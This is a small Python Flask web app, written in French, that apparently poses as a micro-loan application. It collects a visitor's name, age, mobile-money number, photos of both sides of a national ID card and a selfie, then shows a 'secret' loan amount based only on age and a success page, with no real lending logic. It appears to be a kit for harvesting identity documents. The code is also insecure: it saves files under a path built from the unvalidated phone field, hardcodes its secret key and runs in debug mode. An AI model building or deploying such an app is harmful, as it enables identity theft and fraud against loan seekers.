import os
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'mon_pret_secret_2026'

# Dossier pour les photos
UPLOAD_FOLDER = 'reception_pieces'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/etape1')
def etape1():
    return render_template('etape1.html')

@app.route('/etape2', methods=['POST'])
def etape2():
    session['nom'] = request.form.get('nom')
    session['age'] = request.form.get('age')
    return render_template('etape2.html')

@app.route('/etape3', methods=['POST'])
def etape3():
    tel = request.form.get('tel_money')
    session['tel'] = tel
    # Sauvegarde simplifiée des photos
    for key in ['cni_recto', 'cni_verso', 'selfie']:
        file = request.files.get(key)
        if file:
            file.save(os.path.join(UPLOAD_FOLDER, f"{tel}_{key}.jpg"))
    
    # Calcul du montant secret
    age = int(session.get('age', 0))
    if 18 <= age <= 25: montant = "25.000"
    elif 26 <= age <= 35: montant = "50.000"
    else: montant = "150.000"
    
    session['montant_final'] = montant
    return render_template('etape3.html', montant_max=montant)

@app.route('/final', methods=['POST'])
def final():
    return render_template('succes.html', montant_final=session.get('montant_final'))

if __name__ == '__main__':
    app.run(debug=True)